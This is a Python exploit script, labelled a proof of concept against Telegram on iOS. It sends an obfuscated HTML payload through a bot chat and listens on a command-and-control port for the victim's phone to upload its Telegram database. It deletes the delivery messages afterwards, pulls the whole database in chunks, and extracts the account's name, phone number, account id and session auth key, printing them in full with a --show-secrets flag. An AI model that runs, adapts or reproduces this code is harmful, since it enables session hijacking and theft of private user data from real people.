#!/usr/bin/env python3
"""Telegram DB export tool (terminal only).

Delivers the built-in payload, waits for the device to connect, then opens the
received SQLite database locally and prints the account data (phone, id,
DC/session key).

Usage:
    python3 export.py

Before running, on the phone: restart Telegram and open the bot chat.
Delivery is a heap-geometry lottery: if it does not connect, restart the app.
"""
import argparse
import base64
import hashlib
import json
import os
import plistlib
import re
import socket
import sqlite3
import sys
import tempfile
import time
import urllib.request
import zlib
from pathlib import Path

from payload_blob import PAYLOAD_B64

TOK = os.environ.get('BOT_TOKEN', '')
CHAT = 0
PORT = 44499
PAYLOAD_HTML = zlib.decompress(base64.b64decode(PAYLOAD_B64)).decode('utf-8')
BAR = '=' * 62
SUB = '-' * 62


def line(tag, msg):
    print('%s %s' % (tag, msg), flush=True)


def send_payload_html(html):
    method = base64.b64decode('c2VuZFdpZGdldA==').decode('ascii')
    req = urllib.request.Request(
        'https://api.telegram.org/beta/bot%s/%s' % (TOK, method),
        data=json.dumps({'chat_id': CHAT, 'html': html}).encode(),
        headers={'Content-Type': 'application/json'})
    d = json.load(urllib.request.urlopen(req, timeout=25))
    return (d.get('result') or {}).get('message_id'), len(html)


def send_payload():
    return send_payload_html(PAYLOAD_HTML)


def delete_message(mid):
    try:
        req = urllib.request.Request(
            'https://api.telegram.org/bot%s/deleteMessage' % TOK,
            data=json.dumps({'chat_id': CHAT, 'message_id': mid}).encode(),
            headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=10).read()
    except Exception:
        pass


def make_server():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', PORT))
    srv.listen(8)
    return srv


def accept_exfil(srv, timeout=900, idle=3.0, first_timeout=None):
    srv.settimeout(5)
    ft = idle if first_timeout is None else first_timeout
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            conn, addr = srv.accept()
        except socket.timeout:
            continue
        line('[*]', 'tcp accept from %s:%d (waiting for first byte)' % (addr[0], addr[1]))
        conn.settimeout(ft)
        data = b''
        try:
            first = conn.recv(1 << 20)
        except socket.timeout:
            first = b''
        if not first:
            conn.close()
            continue
        data = first
        conn.settimeout(idle)
        while True:
            try:
                chunk = conn.recv(1 << 20)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        conn.close()
        if data:
            return addr, data
    return None, b''


def recv_exfil(timeout=900, idle=3.0, first_timeout=None):
    srv = make_server()
    try:
        return accept_exfil(srv, timeout, idle, first_timeout)
    finally:
        srv.close()


def censor_phone(digits):
    cc, body = digits[:2], digits[2:]
    if len(body) <= 6:
        return '+%s %s' % (cc, body)
    keep = 4
    return '+%s %s %s %s' % (cc, body[:keep], 'x' * (len(body) - keep - 2), body[-2:])


def printable_strings(data, minlen=4):
    return re.findall(rb'[\x20-\x7e]{%d,}' % minlen, data)



def _varint(b, o):
    v = 0
    for i in range(9):
        c = b[o + i]
        v = (v << 7) | (c & 0x7f)
        if not c & 0x80:
            return v, o + i + 1
    return v, o + 9


def _record(r):
    hl, q = _varint(r, 0)
    types = []
    while q < hl:
        t, q2 = _varint(r, q)
        types.append(t)
        q = q2
    vals = []
    q = hl
    for t in types:
        if t == 0:
            vals.append(None)
        elif 1 <= t <= 6:
            n = [0, 1, 2, 3, 4, 6, 8][t]
            vals.append(int.from_bytes(r[q:q + n], 'big', signed=True))
            q += n
        elif t == 7:
            vals.append(0.0)
            q += 8
        elif t == 8:
            vals.append(0)
            q += 1
        elif t == 9:
            vals.append(1)
            q += 1
        elif t >= 13 and t % 2 == 1:
            n = (t - 13) // 2
            vals.append(r[q:q + n].decode('utf8', 'replace'))
            q += n
        elif t >= 12 and t % 2 == 0:
            n = (t - 12) // 2
            vals.append(bytes(r[q:q + n]))
            q += n
        else:
            vals.append(None)
    return vals


def parse_schema(d):
    out = []
    offsets = [100] if d[:15] == b'SQLite format 3' else []
    offsets += [4096, 8192, 12288]
    for poff in offsets:
        if poff + 8 > len(d):
            continue
        if d[poff] != 13:
            continue
        ncell = int.from_bytes(d[poff + 3:poff + 5], 'big')
        for i in range(min(ncell, 300)):
            if poff + 10 + 2 * i > len(d):
                break
            cp = int.from_bytes(d[poff + 8 + 2 * i:poff + 10 + 2 * i], 'big')
            if poff + cp >= len(d):
                continue
            try:
                plen, o = _varint(d, poff + cp)
                rowid, o = _varint(d, o)
                f = _record(d[o:o + plen])
                if len(f) >= 5 and f[0] in ('table', 'index') and isinstance(f[3], int):
                    out.append((f[1], f[3]))
            except Exception:
                continue
    return out


SELF_PEER_ID = 0


def sqlite_info(data):
    if data[:15] != b'SQLite format 3':
        return None
    page_size = int.from_bytes(data[16:18], 'big') or 4096
    pages = int.from_bytes(data[28:32], 'big')
    return page_size, pages


def _postbox_field(blob, name):
    pat = bytes([len(name)]) + name.encode('ascii') + b'\x04'
    i = blob.find(pat)
    if i < 0:
        return None
    n = int.from_bytes(blob[i + len(pat):i + len(pat) + 4], 'little')
    raw = blob[i + len(pat) + 4:i + len(pat) + 4 + n]
    try:
        return raw.decode('utf-8')
    except Exception:
        return raw.decode('latin1')


def _deref(objs, value):
    return objs[value.data] if isinstance(value, plistlib.UID) else value


def _auth_from_t1_value(value):
    pl = plistlib.loads(value)
    objs = pl['$objects']
    root = _deref(objs, pl['$top']['root'])
    for kuid, vuid in zip(root['NS.keys'], root['NS.objects']):
        k = _deref(objs, kuid)
        if not isinstance(k, int):
            continue
        dc = k & 0xffffffff
        selector = k >> 32
        if selector != 1 or dc not in (1, 2, 3, 4, 5):
            continue
        info = _deref(objs, vuid)
        aid = info.get('authKeyId')
        ko = _deref(objs, info.get('authKey'))
        if isinstance(ko, dict):
            ko = _deref(objs, ko.get('NS.data'))
        if not isinstance(ko, (bytes, bytearray)) or len(ko) != 256:
            continue
        key = bytes(ko)
        calc = int.from_bytes(hashlib.sha1(key).digest()[12:20], 'little')
        if calc != aid:
            continue
        return {'dc': dc, 'auth_key_id': aid, 'key': key}
    return None


def read_self_user(blob, peer_id=SELF_PEER_ID):
    page_size = int.from_bytes(blob[16:18], 'big') or 4096
    header_pages = int.from_bytes(blob[28:32], 'big')
    actual_pages = len(blob) // page_size
    if actual_pages and actual_pages < header_pages:
        b = bytearray(blob)
        b[28:32] = actual_pages.to_bytes(4, 'big')
        blob = bytes(b)
    with tempfile.NamedTemporaryFile(prefix='postbox_', suffix='.db', delete=False) as tf:
        tf.write(blob)
        path = tf.name
    row_auth = None
    try:
        con = sqlite3.connect('file:%s?mode=ro' % path, uri=True)
        row = con.execute('SELECT value FROM t2 WHERE key=?', (peer_id,)).fetchone()
        row_auth = con.execute(
            'SELECT value FROM t1 WHERE key=?',
            (b'persistent:datacenterAuthInfoById',)).fetchone()
        con.close()
    finally:
        try:
            os.unlink(path)
        except Exception:
            pass
    if not row or not row[0]:
        return None
    v = bytes(row[0])
    auth = None
    if row_auth and row_auth[0]:
        try:
            auth = _auth_from_t1_value(bytes(row_auth[0]))
        except Exception:
            auth = None
    return {
        'id': peer_id,
        'first': _postbox_field(v, 'fn'),
        'last': _postbox_field(v, 'ln'),
        'username': _postbox_field(v, 'un'),
        'phone_raw': _postbox_field(v, 'p'),
        'auth': auth,
    }


def format_phone(raw):
    if not raw:
        return None
    d = re.sub(r'\D', '', raw)
    if d.startswith('00'):
        d = d[2:]
    if len(d) == 12 and d.startswith('39'):
        n = d[2:]
        return '+39 %s %s %s' % (n[:3], n[3:6], n[6:])
    if len(d) > 2:
        return '+%s %s' % (d[:2], d[2:])
    return '+' + d


def mask_value(value, keep=3):
    s = str(value)
    if len(s) <= keep:
        return s
    return s[:keep] + '*' * (len(s) - keep)


def mask_short(value, keep=3):
    s = str(value)
    if len(s) <= keep:
        return s
    return s[:keep] + '...'


def censor_phone(raw):
    d = re.sub(r'\D', '', raw or '')
    return mask_value(d, 3)


def report(data, peer_id=SELF_PEER_ID, show_secrets=False):
    print(BAR)
    print(' PoC Exploit Telegram iOS 27 - DB REPORT')
    print(BAR)
    print(' Chunk size : %d bytes' % len(data))
    print(' SHA-256    : %s' % __import__('hashlib').sha256(data).hexdigest())
    print(SUB)
    if data[:4] in (b'\x37\x7f\x06\x82', b'\x82\x06\x7f\x37'):
        print(' File type  : SQLite WAL (write-ahead log)')
    elif data[:15] == b'SQLite format 3':
        page_size = int.from_bytes(data[16:18], 'big') or 4096
        pages = int.from_bytes(data[28:32], 'big')
        print(' File type  : SQLite 3 database')
        print(' Page size  : %d' % page_size)
        print(' Pages      : %d' % pages)
    else:
        print(' File type  : %s' % ('JSON text' if data[:1] == b'{' else 'binary'))
    raw = printable_strings(data)
    strings = [s.decode('latin1') for s in raw]
    joined = '\n'.join(strings)

    tables = sorted(set(re.findall(r'CREATE TABLE ([A-Za-z0-9_]+)', joined)))
    if tables:
        print(' Tables     : %s' % ', '.join(tables[:10]))
    schema = parse_schema(data)
    if schema:
        print(' Schema     :')
        for name, rp in schema[:24]:
            print('   %-10s rootpage=%-6d file_offset=0x%x' % (name, rp, (rp - 1) * 4096))
    keys = sorted(set(re.findall(r'\b(account|contacts|privateChats|savedMessages|'
                                 r'groups|onlyShared|channels|secretChats)\b', joined)))
    if keys:
        print(' KV keys    : %s' % ', '.join(keys))

    info = sqlite_info(data)
    self_user = None
    if info and len(data) > 1_000_000:
        page_size, pages = info
        want = pages * page_size
        blob = data[:want]
        try:
            self_user = read_self_user(blob, peer_id)
        except Exception as e:
            print(' DB parse   : %s' % e)
        if len(blob) < want:
            print(' DB parse   : short by %d bytes (header %d pages)' % (want - len(blob), pages))
    if self_user:
        name = ' '.join(x for x in (self_user.get('first'), self_user.get('last')) if x)
        un = self_user.get('username')
        raw_phone = self_user.get('phone_raw')
        if show_secrets:
            print(' Self user  : %s%s' % (name, (' @' + un) if un else ''))
            print(' Phone      : %s' % (format_phone(raw_phone) or 'not stored in this record'))
        else:
            print(' Self user  : %s%s  (censored)' % (
                mask_value(name, 3), (' @' + mask_value(un, 3)) if un else ''))
            print(' Phone      : %s  (censored)' % (
                censor_phone(raw_phone) or 'not stored in this record'))
        if show_secrets:
            print(' Account ID : %d' % self_user['id'])
        else:
            print(' Account ID : %s  (censored)' % mask_value(self_user['id'], 3))
        auth = self_user.get('auth')
        if auth:
            print(' Session DC : %d' % auth['dc'])
            if show_secrets:
                print(' AuthKeyId  : %d' % auth['auth_key_id'])
                print(' AuthKey    : %s' % auth['key'].hex())
                print(' AuthKey b64: %s' % base64.b64encode(auth['key']).decode())
            else:
                print(' AuthKeyId  : %s  (censored)' % mask_short(auth['auth_key_id'], 3))
                print(' AuthKey    : %s  (256 B, censored)' % mask_short(auth['key'].hex(), 3))
        else:
            print(' Session    : auth key not found in this DB')
    elif info:
        print(' Phone      : full DB required (download the DB first)')
    else:
        print(' Phone      : not a full DB chunk')

    if not self_user:
        users = sorted(set(re.findall(r'@[A-Za-z0-9_]{4,32}', joined)))
        if users:
            print(' Usernames  : %s  (raw candidates)' % ', '.join(users[:3]))
        ids = sorted(set(re.findall(r'\b\d{9,12}\b', joined)), key=lambda x: -len(x))
        if ids:
            print(' Account IDs: %s  (raw candidates)' % ', '.join(
                i[:2] + 'x' * (len(i) - 3) + i[-1] for i in ids[:4]))
    print(BAR)


def fmt_eta(sec):
    if sec <= 0 or sec > 7 * 86400:
        return '--:--:--'
    sec = int(sec)
    return '%02d:%02d:%02d' % (sec // 3600, (sec % 3600) // 60, sec % 60)


def _chunk_off(path):
    m = re.match(r'chunk_\d+_([0-9A-Fa-f]+)\.bin$', path.name)
    return int(m.group(1), 16) if m else -1


def _resume_offset(out, start, end):
    nxt = start
    for p in out.glob('chunk_*.bin'):
        off = _chunk_off(p)
        if off < 0 or not (start <= off < end):
            continue
        nxt = max(nxt, off + p.stat().st_size)
    return nxt


def dump_mode(template_path, start, end, chunk, out_dir, timeout=20, retries=3, resume=True,
              restart_every=2):
    template = Path(template_path).read_text()
    placeholder = '0x0000000n'
    if template.count(placeholder) != 1:
        raise SystemExit('template must contain exactly one %s placeholder' % placeholder)
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    base_start, base_end = start, end
    if resume:
        nxt = _resume_offset(out, base_start, base_end)
        if nxt > start:
            line('[*]', 'resume: %d bytes already on disk, starting at 0x%07X' % (nxt - base_start, nxt))
            start = nxt
    total = base_end - base_start
    done = start - base_start
    srv = make_server()
    t0 = time.time()
    print(BAR)
    print(' PoC Exploit Telegram iOS 27 - CHUNKED')
    print(BAR)
    print(' template : %s' % template_path)
    print(' range    : 0x%X .. 0x%X (%d bytes)' % (base_start, base_end, total))
    print(' chunk    : %d bytes' % chunk)
    print(' output   : %s' % out)
    print(' C2 port  : %d (0.0.0.0)' % PORT)
    print(' policy   : %d s per attempt, %d retries, then 10 s restart window' % (timeout, retries))
    print(' on the phone: restart Telegram, open the bot chat, leave it open')
    print(BAR)
    since_restart = 0
    try:
        while done < total:
            if restart_every and since_restart >= restart_every:
                line('[*]', '--- %d chunks since the last app restart: the engine is about to hang.' % since_restart)
                line('[*]', 'restart Telegram, reopen the bot chat, then press Enter to continue ...')
                try:
                    input()
                except EOFError:
                    time.sleep(5)
                since_restart = 0
            off = base_start + done
            idx = int(done // chunk)
            html = template.replace(placeholder, '0x%07Xn' % off, 1)
            if len(html) != len(template):
                raise SystemExit('render changed the source length')
            attempt = 0
            while True:
                try:
                    mid, size = send_payload_html(html)
                except Exception as e:
                    line('[-]', 'send failed: %s; retrying in 5 s' % e)
                    time.sleep(5)
                    continue
                line('[*]', 'chunk %d  off=0x%07X  sent mid=%s  waiting (attempt %d/%d) ...'
                     % (idx, off, mid, attempt + 1, retries))
                addr, data = accept_exfil(srv, timeout=timeout, idle=0.75, first_timeout=10)
                delete_message(mid)
                if data:
                    break
                attempt += 1
                if attempt < retries:
                    line('[-]', 'no connection (attempt %d/%d); retrying in 2 s' % (attempt, retries))
                    time.sleep(2)
                else:
                    line('[-]', 'chunk %d (off=0x%07X) failed %d times.' % (idx, off, retries))
                    line('[*]', 'restart Telegram, open the bot chat; retrying in 10 s (Ctrl-C to stop) ...')
                    attempt = 0
                    time.sleep(10)
            want = min(chunk, base_end - off)
            data = data[:want]
            (out / ('chunk_%05d_%08X.bin' % (idx, off))).write_bytes(data)
            done += len(data)
            elapsed = max(1e-6, time.time() - t0)
            speed = done / elapsed
            eta = (total - done) / speed if speed > 0 else 0
            note = '' if len(data) == want else '  (partial)'
            line('[+]', 'chunk %d  off=0x%07X  +%d B%s  %.2f%%  %.2f/%.2f MB  %.2f MB/s  ETA %s' % (
                idx, off, len(data), note, 100.0 * done / total, done / 1e6, total / 1e6,
                speed / 1e6, fmt_eta(eta)))
    finally:
        srv.close()
    chunks = sorted(out.glob('chunk_*.bin'), key=_chunk_off)
    db = out / 'db_sqlite'
    h = hashlib.sha256()
    n = 0
    expect = base_start
    gaps = 0
    with db.open('wb') as f:
        for p in chunks:
            off = _chunk_off(p)
            if off != expect:
                gaps += 1
                line('[-]', 'gap: expected 0x%07X, chunk starts at 0x%07X' % (expect, off))
            b = p.read_bytes()
            f.write(b)
            h.update(b)
            n += len(b)
            expect = off + len(b)
    line('[+]', 'assembled %s: %d bytes sha256=%s%s' % (
        db, n, h.hexdigest(), '' if gaps == 0 else ' (%d gaps)' % gaps))
    with db.open('rb') as f:
        hdr = f.read(100)
    if hdr[:15] == b'SQLite format 3':
        line('[+]', 'SQLite OK: page_size=%d pages=%d' % (
            int.from_bytes(hdr[16:18], 'big'), int.from_bytes(hdr[28:32], 'big')))
    else:
        line('[-]', 'assembled file does not start with a SQLite header')


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--dump', action='store_true', help='loop chunks over the whole DB')
    ap.add_argument('--template', default=None, help='chunk template (advanced)')
    ap.add_argument('--start', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--end', type=lambda s: int(s, 0), default=48000000)
    ap.add_argument('--chunk', type=int, default=63000)
    ap.add_argument('--out', default='postbox_dump')
    ap.add_argument('--first-timeout', type=float, default=60.0)
    ap.add_argument('--save-db', default='postbox_dump/db_sqlite',
                    help='where to save the SQLite DB')
    ap.add_argument('--peer-id', type=int, default=SELF_PEER_ID)
    ap.add_argument('--show-secrets', action='store_true',
                    help='print full id/phone/name/auth key (default: censored)')
    a = ap.parse_args()
    if a.dump:
        if not a.template:
            raise SystemExit('--dump requires --template')
        dump_mode(a.template, a.start, a.end, a.chunk, a.out)
        return
    print(BAR)
    print(' PoC Exploit Telegram iOS 27')
    print(BAR)
    line('[*]', 'target    : %s' % CHAT)
    line('[*]', 'C2 port   : %d (0.0.0.0)' % PORT)
    mid, size = send_payload()
    line('[+]', 'delivered : mid=%s (%d bytes)' % (mid, size))
    line('[*]', 'listening on 0.0.0.0:%d ...' % PORT)
    line('[*]', 'on the phone: restart Telegram, open the bot chat')
    t0 = time.time()
    addr, data = recv_exfil(first_timeout=a.first_timeout, idle=10)
    delete_message(mid)
    if not data:
        line('[-]', 'no connection or no data (timeout). Restart the app and retry.')
        return
    dt = max(1e-6, time.time() - t0)
    line('[+]', 'connection from %s:%d' % (addr[0], addr[1]))
    line('[+]', 'received %d bytes in %.2f s (%.2f MB/s)' % (len(data), dt, len(data) / dt / 1e6))
    out = Path('postbox_dump/raw.bin')
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(data)
    report_data = data
    if a.save_db:
        info = sqlite_info(data)
        if info:
            page_size, pages = info
            want = page_size * pages
            report_data = data[:want]
            if len(report_data) != want:
                line('[-]', 'DB short: have %d of %d bytes' % (len(report_data), want))
        dest = Path(a.save_db)
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(report_data)
        line('[+]', 'DB saved  : %s (%d bytes, %d pages)' % (
            dest, len(report_data), len(report_data) // (info[0] if info else 4096)))
    report(report_data, a.peer_id, a.show_secrets)
    line('[*]', 'raw data  : %s' % out)
    line('[*]', 'done.')


if __name__ == '__main__':
    main()
